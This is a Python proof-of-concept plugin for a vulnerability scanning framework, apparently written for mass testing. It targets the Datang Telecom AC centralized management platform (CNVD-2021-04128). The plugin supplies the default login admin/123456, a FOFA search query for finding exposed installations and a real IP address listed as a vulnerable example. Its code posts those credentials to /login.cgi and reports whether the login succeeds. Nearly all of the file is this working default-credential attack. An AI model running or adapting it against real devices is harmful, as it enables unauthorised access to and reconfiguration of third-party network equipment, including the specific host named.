# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "大唐电信AC集中管理平台默认口令",                        # 漏洞名称
        "VulnID" : "CNVD-2021-04128",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "大唐电信AC集中管理平台",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            大唐电信科技股份有限公司是电信科学技术研究院（大唐电信科技产业集团）控股的的高科技企业，
            公司于1998年在北京注册成立，同年10月，“大唐电信”股票在上交所挂牌上市。 
            大唐电信AC集中管理平台存在弱口令漏洞，攻击者可利用此漏洞获取敏感信息，更改设备配置。
            默认口令:admin/123456
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            title="大唐电信AC集中管理平台"
        """,                     # fofa搜索语句
        "example" : "http://60.215.217.141:800/",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/login.cgi" # url自己按需调整
        data = "user=admin&password1=%E8%AF%B7%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81&password=123456&Submit="

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.post(url,data = data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if "</script></head><body onLoad='init();'>" in req.text and req.status_code == 200:
                vuln = [True,req.text]
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()